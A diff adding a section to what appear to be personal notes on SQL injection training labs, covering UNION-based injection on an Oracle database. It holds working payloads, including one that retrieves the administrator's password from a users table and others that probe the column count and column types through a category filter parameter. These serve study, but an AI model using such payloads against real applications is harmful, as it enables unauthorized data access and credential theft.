@@ -93,3 +93,22 @@ Ans  : GET /filter?category='
     - Find Password OF  administrator : 
 
       ' UNION SELECT password_rqmxso , 'ABC' FROM users_onouxe WHERE username_funlze='administrator' --+
+
+
+___________________________________________________________________________________________
+Lab6: SQL injection attack, listing the database contents on Oracle
+
+GIVEN  :The database contains a table that holds usernames and passwords
+
+        You need to determine the name of this table and the columns it contains, then retrieve the PASSWD OF administrator
+
+ANS : GET /filter?category=Gifts'--+
+
+      - find no of columns
+        ' union select null,null from dual --+ : oracle db only
+
+      -find data type of columns 
+       ' union select 'ABC','DEF' from dual --+
+
+
+      
